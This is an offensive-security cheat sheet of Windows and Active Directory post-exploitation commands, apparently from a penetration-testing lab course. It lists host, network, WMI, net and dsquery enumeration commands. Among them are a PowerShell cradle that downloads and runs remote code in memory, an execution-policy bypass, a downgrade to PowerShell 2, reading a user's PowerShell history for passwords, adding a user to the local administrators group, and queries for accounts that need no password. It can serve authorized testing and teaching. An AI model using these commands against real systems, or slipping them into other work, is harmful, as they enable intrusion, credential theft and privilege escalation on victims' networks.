### **Basic Enumeration Commands**
1. Prints the PC's Name: `hostname`
2. Prints out the OS version and revision level: `[System.Environment]::OSVersion.Version`
3. Prints the patches and hotfixes applied to the host: `wmic qfe get Caption,Description,HotFixID,InstalledOn`
4. Prints out network adapter state and configurations: `ipconfig /all`
5. Displays a list of environment variables for the current session (ran from CMD-prompt): `set`
6. Displays the domain name to which the host belongs (ran from CMD-prompt): `echo %USERDOMAIN%`
7. Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt): `echo %logonserver%`
8. Systeminfo: `systeminfo`
9. Using qwinsta to list logged users: `qwinsta`
### **Harnessing PowerShell**
1. Lists available modules loaded for use.: `Get-Module`
2. Will print the execution policy settings for each scope on a host.: `Get-ExecutionPolicy -List`
3. This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.: `Set-ExecutionPolicy Bypass -Scope Process`
4. With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.: `Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`
5. Return environment values such as key paths, users, computer information, etc.: `Get-ChildItem Env: | ft Key,Value`
6. This is a quick and easy way to download a file from the web using PowerShell and call it from memory.: `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"`
7. Downgrade Powershell: `powershell.exe -version 2`
### **Checking Defenses**
1. Firewall Checks: `netsh advfirewall show allprofiles`
2. Windows Defender Check (from CMD.exe): `sc query windefend`
3. Get-MpComputerStatus: `Get-MpComputerStatus`
### **Network Information**
1. Lists all known hosts stored in the arp table.: `arp -a `
2. Prints out adapter settings for the host. We can figure out the network segment from here.: `ipconfig /all`
3. Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.: `route print`
4. Displays the status of the host's firewall. We can determine if it is active and filtering traffic.: `netsh advfirewall show state`
### **Windows Management Instrumentation (WMI)**
1. Prints the patch level and description of the Hotfixes applied: `wmic qfe get Caption,Description,HotFixID,InstalledOn`
2. Displays basic host information to include any attributes within the list: `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`
3. A listing of all processes on host: `wmic process list /format:list`
4. Displays information about the Domain and Domain Controllers: `wmic ntdomain list /format:list`
5. Displays information about all local accounts and any domain accounts that have logged into the device: `wmic useraccount list /format:list`
6. Information about all local groups: `wmic group list /format:list`
7. Dumps information about any system accounts that are being used as service accounts.: `wmic sysaccount list /format:list`
### **Net Commands**
1. Information about password requirements: `net accounts`
2. Password and lockout policy: `net accounts /domain`
3. Information about domain groups: `net group /domain`
4. List users with domain admin privileges: `net group "Domain Admins" /domain`
5. List of PCs connected to the domain: `net group "domain computers" /domain`
6. List PC accounts of domains controllers: `net group "Domain Controllers" /domain`
7. User that belongs to the group: `net group <domain_group_name> /domain`
8. List of domain groups: `net groups /domain`
9. All available groups: `net localgroup`
10. List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default): `net localgroup administrators /domain`
11. Information about a group (admins): `net localgroup Administrators`
12. Add user to administrators: `net localgroup administrators [username] /add`
13. Check current shares: `net share`
14. Get information about a user within the domain: `net user <ACCOUNT_NAME> /domain`
15. List all users of the domain: `net user /domain`
16. Information about the current user: `net user %username%`
17. Mount the share locally: `net use x: \computer\share`
18. Get a list of computers: `net view`
19. Shares on the domains: `net view /all /domain[:domainname]`
20. List shares of a computer: `net view \computer /ALL`
21. List of PCs of the domain: `net view /domain `
### **Dsquery**
1. User Search: `dsquery user`
2. Computer Search: `dsquery computer`
3. Wildcard Search: `dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"`
4. Users With Specific Attributes Set (PASSWD_NOTREQD): `dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl`
5. Searching for Domain Controllers: `dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName`
